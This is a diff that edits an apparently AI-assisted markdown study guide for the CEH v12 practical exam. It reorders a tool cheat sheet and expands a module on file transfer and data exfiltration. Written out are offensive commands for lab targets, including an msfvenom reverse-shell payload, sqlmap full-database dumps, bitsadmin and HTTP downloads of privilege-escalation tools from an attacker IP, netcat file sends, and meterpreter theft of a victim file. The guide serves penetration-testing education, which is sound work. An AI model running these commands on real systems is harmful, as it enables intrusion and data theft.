@@ -1,6 +1,3 @@
-
-***
-
 # CEH v12 Practical Exam - Ultimate Master Reference
 
 > **⚠️ Important Disclaimer:** This document is for **educational purposes and exam preparation only**. The techniques and tools described must only be used on systems you own or have explicit, written permission to test. Unauthorized access to computer systems is illegal and unethical.
@@ -14,7 +11,8 @@
 6.  [Module 5: Network Penetration Testing](#-module-5-network-penetration-testing)
 7.  [Module 6: Cryptography & Steganography](#-module-6-cryptography--steganography)
 8.  [Module 7: Cloud & IoT (Conceptual)](#-module-7-cloud--iot-conceptual)
-9.  [Toolbox: Command Cheat Sheet](#-toolbox-command-cheat-sheet)
+9.  [Module 8: Data Exfiltration & File Transfers](#-module-8-data-exfiltration--file-transfers)
+10. [Toolbox: Command Cheat Sheet](#-toolbox-command-cheat-sheet)
 
 ---
 
@@ -369,34 +367,13 @@
 
 ---
 
-## 🧰 Toolbox: Command Cheat Sheet
-
-| Tool | Command | Purpose |
-| :--- | :--- | :--- |
-| **`nmap`** | `nmap -sS -sV -A <target>` | Stealth scan with version and OS detection |
-| **`netcat`** | `nc -nv <target> <port>` | Banner grabbing / manual service interaction |
-| **`john`** | `john --wordlist=rockyou.txt hashes.txt` | Password cracking |
-| **`msfvenom`** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=X LPORT=Y -f exe > shell.exe` | Generate a Windows payload |
-| **`sqlmap`** | `sqlmap -u "http://site.com/page?id=1" --dump-all` | Automate SQL injection |
-| **`steghide`** | `steghide extract -sf file.jpg -p 'pass'` | Extract hidden data from an image |
-| **`curl`** | `curl -X POST -d "param=value" http://site.com/login` | Interact with web apps from CLI |
-| **`find` (Lin)** | `find / -perm -u=s -type f 2>/dev/null` | Find SUID files for priv esc |
-| **`whoami /priv` (Win)** | `whoami /priv` | Check Windows user privileges |
-| **`WinPEASany.exe` (Win)** | `WinPEASany.exe` | Run Windows priv esc enumerator (after upload) |
-
-Of course. This is a critical skill for the exam and real-world penetration testing. Here is the new chapter to add to the master reference document.
-
-***
-
 ## 📤 Module 8: Data Exfiltration & File Transfers
 
-A common exam task is to upload a tool (like WinPEAS/LinPEAS) to a target or download a flag file from it. The method you use depends entirely on which services are available.
+A common exam task is to upload a tool (like WinPEAS/LinPEAS) to a target or download a flag file from it. The method depends on which services are available.
 
 ### Core Concept: The "Push" vs. "Pull" Method
 *   **Push:** You host the file on your machine and the *target pulls* it down.
 *   **Pull:** You upload the file from your machine to the target (often trickier and requires specific services).
-
----
 
 ### 1. Using HTTP/S (The Most Reliable Method)
 This is often the easiest way. You host a simple web server on your attacking machine and use tools on the target to download the file.
@@ -430,8 +407,6 @@ python2 -m SimpleHTTPServer 80
     bitsadmin /transfer myjob /download /priority normal http://YOUR_IP/winpeasany.exe C:\Windows\Temp\winpeasany.exe
     ```
 
----
-
 ### 2. Using FTP (If an FTP Server is Running)
 If the target has an FTP server you can access (e.g., you found credentials), you can upload files to it.
 
@@ -463,8 +438,6 @@ ftp YOUR_IP
 > exit
 ```
 
----
-
 ### 3. Using SCP/SFTP (If SSH is Open)
 This is a secure and efficient method if you have SSH credentials on the target.
 
@@ -476,8 +449,6 @@ scp /path/to/linpeas.sh username@TARGET_IP:/tmp/linpeas.sh
 # Download a file FROM the target (PULL)
 scp username@TARGET_IP:/path/to/flag.txt ./
 ```
-
----
 
 ### 4. Using SMB (Windows File Sharing)
 If you can create an SMB share, you can easily transfer files.
@@ -497,8 +468,6 @@ copy Z:\winpeasany.exe .
 copy \\YOUR_IP\share-name\winpeasany.exe .
 ```
 
----
-
 ### 5. Using Metasploit/Meterpreter
 This is often the simplest method once you have a initial shell.
 
@@ -512,8 +481,6 @@ meterpreter > download C:\\Users\\Victim\\secret.txt ./
 
 # The meterpreter shell will automatically use the established connection.
 ```
-
----
 
 ### 6. Using Netcat (The "Last Resort" Method)
 Netcat can be used to transfer raw data over any port. This is noisy and unstable for large files but can work in restricted environments.
@@ -536,8 +503,6 @@ nc -w 3 RECEIVER_IP 4444 < file_to_send
 nc.exe -w 3 RECEIVER_IP 4444 < file_to_send.exe
 ```
 
----
-
 ### Summary Table: How to Get Your Tools On Target
 
 | Your Situation | Best Method | Command (On Your Machine) | Command (On Target) |
@@ -550,5 +515,23 @@ nc.exe -w 3 RECEIVER_IP 4444 < file_to_send.exe
 | **Nothing else works** | **Netcat** | `nc -lvnp 4444 > file` (recv) | `nc your_ip 4444 < file` (send) |
 
 **Exam Tip:** The **Python HTTP Server** method is the most universal and least likely to be blocked by basic firewalls. It should be your first attempt in most scenarios. Always have a server ready (`python3 -m http.server 80`) during the exam.
+
+---
+
+## 🧰 Toolbox: Command Cheat Sheet
+
+| Tool | Command | Purpose |
+| :--- | :--- | :--- |
+| **`nmap`** | `nmap -sS -sV -A <target>` | Stealth scan with version and OS detection |
+| **`netcat`** | `nc -nv <target> <port>` | Banner grabbing / manual service interaction |
+| **`john`** | `john --wordlist=rockyou.txt hashes.txt` | Password cracking |
+| **`msfvenom`** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=X LPORT=Y -f exe > shell.exe` | Generate a Windows payload |
+| **`sqlmap`** | `sqlmap -u "http://site.com/page?id=1" --dump-all` | Automate SQL injection |
+| **`steghide`** | `steghide extract -sf file.jpg -p 'pass'` | Extract hidden data from an image |
+| **`curl`** | `curl -X POST -d "param=value" http://site.com/login` | Interact with web apps from CLI |
+| **`find` (Lin)** | `find / -perm -u=s -type f 2>/dev/null` | Find SUID files for priv esc |
+| **`whoami /priv` (Win)** | `whoami /priv` | Check Windows user privileges |
+| **`WinPEASany.exe` (Win)** | `WinPEASany.exe` | Run Windows priv esc enumerator (after upload) |
+| **`python3 -m http.server 80`** | `python3 -m http.server 80` | Host files for download from target |
 
 ***
